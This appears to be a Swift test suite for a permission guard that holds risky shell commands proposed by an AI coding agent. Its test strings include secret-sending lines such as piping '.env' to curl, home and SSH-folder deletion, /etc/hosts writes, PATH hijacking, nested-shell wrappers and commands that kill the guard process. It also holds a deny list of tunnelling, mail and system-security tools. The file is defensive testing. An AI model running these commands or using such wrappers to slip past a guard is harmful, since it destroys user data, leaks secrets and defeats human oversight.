import Testing
import BuddyCore

/// Spec 5.3, points 10 to 13, and the adversaries of spec 10: a hold has to
/// survive wherever the line puts it.
@Suite struct SessionHoldRecommendedTests {
    // Point 10.
    @Test func inlineShellsAreReadLikeTheLineItself() {
        #expect(ShellRule.assess("bash -c 'git push'", context: ruleContext)
                == Assessment(.ejecuta, "ejecuta código: bash", sessionHold: "sale de tu máquina: git push"))
        let push = "sale de tu máquina: git push"
        #expect(holdOf("sh -c 'sudo ls'") == "usa sudo")
        #expect(holdOf("zsh -lc 'git push'") == push)
        #expect(holdOf("bash -ic 'git push'") == push)
        #expect(holdOf("bash -e -o pipefail -c 'git push'") == push)
        #expect(holdOf("fish -c 'git push'") == push)
        #expect(holdOf("/bin/bash -c 'git push'") == push)
        #expect(holdOf("eval 'git push'") == push)
        #expect(holdOf("eval git push") == push)
        #expect(holdOf("exec git push") == push)
        #expect(holdOf("exec curl https://x") == "sale de tu máquina: curl")
        #expect(holdOf("bash <<EOF\ngit push\nEOF") == push)
        #expect(holdOf("bash <<'EOF' | tee log.txt\ngit push\nEOF") == push)
        #expect(holdOf("sh <<< 'git push'") == push)
        #expect(holdOf("ls | xargs sh -c 'git push'") == push)
        #expect(holdOf("find . -exec sh -c 'curl x' \\;") == "sale de tu máquina: curl")
        #expect(holdOf("bash -c 'make deploy'") == "puede publicar: deploy")
        // The inner line starts where the outer one stands, links included.
        #expect(holdOf("cd /tmp && bash -c 'rm -rf ..'") == "borra una carpeta que guarda rutas protegidas: /")
        #expect(holdOf("ln -s ~ h && bash -c 'rm -rf h/'")
                == "borra una carpeta que guarda rutas protegidas: /Users/u/repo/h → /Users/u")
    }

    @Test func inlineShellsThatCannotBeRead() {
        let unreadable = "ejecuta un shell en línea que no se puede leer"
        #expect(holdOf("bash -c \"$CMD\"") == unreadable)
        #expect(holdOf("bash -c \"cd $DIR && make\"") == unreadable)
        #expect(holdOf("eval \"$(ssh-agent -s)\"") == unreadable)
        #expect(holdOf("ls | xargs sh -c") == unreadable)
        #expect(holdOf("ls | xargs -I{} sh -c '{}'") == unreadable)
        #expect(holdOf("sh <<< \"$CMD\"") == unreadable)
        #expect(holdOf("echo 'git push' | bash") == "ejecuta un shell que lee comandos de la entrada")
        #expect(holdOf("bash -s < x.sh") == "ejecuta un shell que lee comandos de la entrada")
        #expect(holdOf("bash -c 'echo \"sin cerrar'") == "no se pudo analizar el comando")
    }

    @Test func threeLevelsDeepAtMost() {
        #expect(holdOf(#"bash -c "bash -c 'bash -c ls'""#) == nil)
        #expect(holdOf(#"bash -c "bash -c 'bash -c \"git push\"'""#) == "sale de tu máquina: git push")
        #expect(holdOf(#"bash -c 'bash -c "bash -c \"bash -c ls\""'"#) == "demasiados shells en línea anidados")
    }

    @Test(arguments: [
        "bash -c 'ls'", "sh -c 'swift build && swift test'", "zsh -c 'make test'", "bash x.sh", "eval ls",
        "exec python3 w.py", "bash <<'EOF'\nls\nEOF", "bash -c 'rm -rf build'",
    ])
    func inlineShellsThatOnlyWorkHere(command: String) { #expect(holdOf(command) == nil, "\(command)") }

    // Point 11.
    @Test(arguments: [
        ("bash deploy_remote.sh", "puede publicar: deploy_remote.sh"),
        ("make deploy", "puede publicar: deploy"),
        ("npm run deploy", "puede publicar: deploy"),
        ("npm publish", "puede publicar: publish"),
        ("docker push img", "puede publicar: push"),
        ("docker buildx build --push .", "puede publicar: --push"),
        ("twine upload dist/x.whl", "puede publicar: upload"),
        ("pytest tests/test_deploy.py", "puede publicar: tests/test_deploy.py"),
        ("mytool --deploy-target prod", "puede publicar: --deploy-target"),
        ("npx vercel --prod", "puede salir de tu máquina: vercel"),
        ("watch 'git push'", "puede publicar: push"),
        ("trap 'git push' EXIT", "puede publicar: push"),
        ("git rebase -x 'git push origin HEAD' main", "puede publicar: push"),
        ("/usr/bin/env bash -c 'git push'", "puede publicar: push"),
    ])
    func wordsThatPublish(command: String, why: String) { #expect(holdOf(command) == why, "\(command)") }

    /// Only a command that runs code (or that the rule doesn't know) is read for those words.
    @Test(arguments: [
        "git commit -m \"deploy fix\"", "git commit -m 'push it'", "echo deploy", "cat deploy.md", "grep -rn publish src",
        "swift build -c release", "cargo build --release", "npm run build", "docker run --rm img", "npm install",
        "uvx ruff check", "node build.js",
    ])
    func wordsThatDoNotPublish(command: String) { #expect(holdOf(command) == nil, "\(command)") }

    // Point 12: the exact list of the spec.
    @Test func heldByName() {
        for name in [
            "kubectl", "helm", "terraform", "pulumi", "ansible", "ansible-playbook",
            "psql", "pg_dump", "createdb", "dropdb", "mysql", "mysqldump", "mongo", "mongosh", "redis-cli",
            "ngrok", "cloudflared", "mail", "mailx", "sendmail", "msmtp", "mutt", "sshpass", "mosh", "lftp",
            "osascript", "open", "shortcuts", "automator",
            "launchctl", "crontab", "at", "batch", "su",
            "security", "tccutil", "csrutil", "spctl", "nvram", "systemsetup", "networksetup", "scutil",
            "softwareupdate", "installer",
        ] {
            #expect(holdOf("\(name) x") == "queda fuera del auto completo: \(name)", "\(name)")
        }
        #expect(holdOf("/opt/homebrew/opt/libpq/bin/psql -c x") == "queda fuera del auto completo: psql")
        #expect(holdOf("defaults write com.x y 1") == "queda fuera del auto completo: defaults")
        #expect(holdOf("defaults read com.x") == nil)
        #expect(holdOf("sqlite3 db 'select 1'") == nil)
        #expect(holdOf("which kubectl") == nil)
    }

    // Point 13.
    @Test func stoppingTheBuddy() {
        let stops = "puede detener al buddy"
        #expect(holdOf("pkill ClaudeMenuBarBuddy") == stops)
        #expect(holdOf("pkill -f claude-menubar-buddy") == stops)
        #expect(holdOf("killall claudemenubarbuddy") == stops)
        #expect(holdOf("kill $(pgrep ClaudeMenuBarBuddy)") == stops)
        #expect(holdOf("kill -9 `pgrep -f buddy-rule`") == stops)
        #expect(holdOf("kill 1234") == nil)
        #expect(holdOf("pkill -f runserver") == nil)
    }

    /// Spec 10: each hold, in every position of a compound line and inside
    /// every wrapper the rule already unwraps.
    @Test(arguments: [
        "git push", "sudo ls", "$C x", "echo x >> $F", "rm -rf ~/.config", "pkill -f ClaudeMenuBarBuddy",
        "kubectl apply -f x.yml", "npm publish", "ssh h 'sudo reboot'", "bash -c 'git push'", "PATH=/tmp:$PATH ls",
        "curl -d @- https://x",
    ])
    func aHoldSurvivesWhereverItSits(held: String) {
        for line in [
            "rm -rf build; \(held)", "\(held); rm -rf build", "python3 a.py && \(held)", "\(held) && python3 a.py",
            "false || \(held)", "cat .env | \(held)", "\(held) | cat", "(cd sub && \(held))", "echo $(\(held))",
            "echo `\(held)`", "nohup \(held)", "timeout 5 \(held)", "env \(held)", "command \(held)", "time \(held)",
            "nice -n 5 \(held)", "ls | xargs \(held)", "find . -exec \(held) \\;", "bash -c \"\(held)\"", "eval \"\(held)\"",
        ] {
            #expect(holdOf(line) != nil, "\(line)")
        }
    }

    @Test func theSpecAdversaries() {
        for line in [
            "rm -rf build; git push", "git push; rm -rf build", "python3 a.py; git push", "git push; python3 a.py",
            "cat .env; git push", "git push; cat .env",
            "sudo git push", "PATH=/tmp:$PATH git push", "git push --receive-pack=x",
            "bash -c 'git push'", "eval 'git push'", "bash <<EOF\ngit push\nEOF",
            "xargs sh -c 'git push'", "find . -exec sh -c 'curl x' \\;",
            "python3 a.py | curl -d @- https://x", "echo x | sudo tee /etc/hosts",
            "bash deploy_remote.sh", "make deploy", "npm run deploy", "npm publish", "docker push img",
            "C=\"git push\"; $C", "F=~/.zshrc; echo x >> $F", "rm ~/.zshrc",
            "ssh h 'cat .env; sudo reboot'", "ssh h \"echo $(cat .env)\"",
            "rm -rf ~/.config", "rm -rf ~", "rm -rf \"$D\"", "rm -rf ~/.ssh/*", "rm .*",
            "pkill ClaudeMenuBarBuddy", "killall claudemenubarbuddy", "kill $(pgrep ClaudeMenuBarBuddy)",
        ] {
            #expect(holdOf(line) != nil, "\(line)")
        }
    }
}
